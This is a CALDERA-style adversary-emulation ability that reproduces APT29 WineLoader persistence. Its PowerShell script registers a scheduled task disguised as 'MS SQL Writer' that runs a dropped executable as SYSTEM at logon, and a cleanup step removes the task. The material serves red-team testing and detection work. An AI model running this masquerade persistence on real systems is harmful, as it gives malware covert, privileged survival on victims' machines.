- id: wineloader-stage3-persistence
  name: WineLoader Stage 3 â€“ Masquerade Task
  description: Creation of a masqueraded scheduled task (Wait for Stage 2)
  tactic: persistence
  technique_id: T1053.005
  technique_name: "Scheduled Task/Job: Scheduled Task"
  platforms:
    windows:
      psh:
        command: |
          $ErrorActionPreference = "Stop";
          $taskName = "MS SQL Writer";
          $taskDesc = "Microsoft SQL Server VSS Writer";
          $workDir = "C:\Users\Public\Music\Work";
          $exePath = "$workDir\sqlwriter.exe";
          try {
              Write-Host "[*] Start Stage 3 execution (Persistence)";
              
              Write-Host "[*] Checking for executable at: $exePath";
              if (Test-Path $exePath) {
                  Write-Host "[+] Executable found. Proceeding with task registration.";
                  
                  Write-Host "[*] Configuring task action, trigger and principal...";
                  $action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $workDir;
                  $trigger = New-ScheduledTaskTrigger -AtLogOn;
                  $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest;

                  Write-Host "[*] Registering scheduled task: $taskName";
                  Register-ScheduledTask `
                      -TaskName $taskName `
                      -Action $action `
                      -Trigger $trigger `
                      -Principal $principal `
                      -Description $taskDesc `
                      -Force | Out-Null;
                  
                  if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
                      Write-Host "[+] Task '$taskName' registered successfully.";
                      Write-Output "task_created_ms_sql_writer";
                  } else {
                      throw "Task registration confirmed by command, but task not found in system.";
                  };
              } else {
                  throw "Race condition detected: File not found at $exePath. Stage 2 might have failed.";
              };
          } catch {
              Write-Host "[!] Error encountered during persistence setup:";
              Write-Error "Error: $($_.Exception.Message)";
              exit 1;
          }
        parsers:
          plugins.stockpile.app.parsers.line:
            - source: apt29.wineloader.persistence
        requirements:
          - plugins.stockpile.app.requirements.paw_provenance:
            - source: apt29.wineloader.status
              match: stage2_executed
        cleanup: |
          $taskName = "MS SQL Writer";
          if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
              Unregister-ScheduledTask -TaskName $taskName -Confirm:$false;
              Write-Host "[+] Cleaned up scheduled task: $taskName";
          };